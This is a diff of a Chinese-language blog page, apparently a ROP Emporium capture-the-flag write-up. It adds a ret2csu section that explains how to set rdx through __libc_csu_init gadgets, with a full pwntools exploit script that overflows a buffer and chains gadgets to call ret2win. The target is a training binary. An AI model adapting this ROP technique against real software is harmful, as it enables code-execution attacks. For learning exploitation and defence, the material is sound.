@@ -446,21 +446,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-05-31
+                    2020-06-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.7k
+                    2.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    13 分
+                    14 分
                 </div>
                 
 
@@ -942,7 +942,45 @@ p<span class="token punctuation">.</span>sendline<span class="token punctuation"
 p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into libpivot.so"</span><span class="token punctuation">)</span>
 
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>待补充…</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h5 id="64位-7"><a href="#64位-7" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/ret2csu.zip" target="_blank" rel="noopener">64位</a>:</h5><p><img src="/images/14/ret2csu/1.jpg" alt><br>程序要求我们call<code>ret2win</code>这个函数, 同时<code>rdx</code>寄存器要放入<code>0xdeadcafebabebeef</code>.</p>
+<p>通过<code>ROPgadget</code>并没有找到<code>pop rdx; ret</code>之类的, 但是从<code>IDA</code>进行分析, 可以看到<code>__libc_csu_init</code>函数中, 有<code>pop r15</code>和<code>mov rdx, r15</code>之类的, 可以间接进行赋值.<br><img src="/images/14/ret2csu/2.jpg" alt></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2csu"</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># var</span>
+init_addr <span class="token operator">=</span> <span class="token number">0x0600E10</span>
+mov_rdx_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400880</span>
+pop_rbx <span class="token operator">=</span> <span class="token number">0x000000000040089A</span>
+
+ret2win <span class="token operator">=</span> <span class="token number">0x00000000004007B1</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> b<span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">0x28</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbx<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop rbx</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop rbp   填写1因为0x400880那串里面有一个add rbx, 1;  再往后有一个cmp, 如果不填写1就又跳回来了.</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>init_addr<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># pop r12  如果不init, setvbuf会将edx填写为0xffffffff</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop r13</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop r14</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadcafebabebeef</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># pop r15</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rdx_r15<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># ret</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># rbx</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># rbp</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r12</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r13</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r14</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r15</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret2win<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ret</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>如果不理解可以通过IDA+Pwntools远程调试, 看清楚栈中数据, 就会理解了。</p>
+<p><img src="/images/14/ret2csu/3.jpg" alt></p>
 
             </div>
             <hr/>
@@ -1473,7 +1511,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">8.6k</span>&nbsp;字
+                class="white-color">8.9k</span>&nbsp;字
             
             
 
